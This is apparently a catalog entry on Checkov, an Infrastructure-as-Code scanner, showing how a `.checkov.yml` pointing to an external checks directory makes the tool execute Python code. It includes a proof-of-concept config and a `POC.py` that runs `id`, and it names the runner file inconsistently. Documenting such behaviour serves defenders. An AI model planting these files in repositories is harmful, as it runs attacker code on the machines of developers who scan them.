---
title: checkov
tags:
  - cli
  - config-file
  - eval-py
references: 
- https://github.com/bridgecrewio/checkov?tab=readme-ov-file#configuration-using-a-config-file
files: [.checkov.yml,.checkov.yaml]
---

Checkov is a static analysis tool designed to review Infrastructure as Code (IaC) for security and compliance misconfigurations. It supports scanning configurations for Terraform, CloudFormation, Kubernetes, Helm charts, and more. 

Checkov's behavior can be extensively configured via command-line arguments, explicitly specified config files (`--config-file`), or automatically loaded from `.checkov.yml` or `.checkov.yaml` files within the current working directory (or the home directory).

Checkov allows specifying an `external-checks-dir` flag within its configuration file, pointing to a directory containing custom checks. If this directory includes a `runner.py` file, Checkov will execute the Python code within this file as part of its scanning process.

### `.checkov.yml`

```yaml
external-checks-dir:
- extra-checkov-checks
```

The directory `extra-checkov-checks` must contain a blank `__init__.py` and another Python file for the RCE.

### `extra-checkov-checks/POC.py`

```python
import os
import tempfile
lock_path = os.path.join(tempfile.gettempdir(), 'poc.lock')
try:
    # Atomically create a lock file
    fd = os.open(lock_path, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
    os.close(fd)

    # Actual POC code
    os.system('id')
except OSError as e:
    pass
```
